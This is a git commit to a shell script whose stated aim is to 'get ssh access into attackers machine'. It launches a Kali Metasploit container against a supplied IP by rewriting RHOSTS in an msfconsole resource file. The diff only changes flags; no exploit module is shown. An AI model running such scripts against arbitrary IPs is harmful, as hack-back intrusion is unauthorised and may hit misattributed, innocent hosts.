cb7fc0bc5e4d89370f34bd3aec488487c0e2b335
Mohamed Bana <mohamed@bana.io>
2023-12-26 14:43:47 +0000

    Try to get ssh access into attackers machine
    Signed-off-by: Mohamed Bana <mohamed@bana.io>

--- logging-and-ssh-into-ips/logging-and-ssh-into-ips.sh
+++ logging-and-ssh-into-ips/logging-and-ssh-into-ips.sh
@@ -6,19 +6,16 @@ IP="${1}"
 echo "trying IP=${IP}"
 echo "--------------------------------"
 
-set -o xtrace
-
 docker run \
   --volume ./:/exploits \
   --volume ./.msf3:/root/.msf3 \
   --net host \
   --rm  \
-  -t \
+  -ti \
   kalilinux/kali-bleeding-edge-metasploit-framework:latest \
   /bin/bash -c "
 echo "pwd=$(pwd)";
-set -o xtrace;
 sed -i 's/RHOSTS 10.0.2.6/RHOSTS ${IP}/g' /root/.msf3/msfconsole.rc;
 cat /root/.msf3/msfconsole.rc;
-msfconsole --real-readline /root/.msf3/msfconsole.rc;
+msfconsole --quiet --real-readline /root/.msf3/msfconsole.rc;
 "
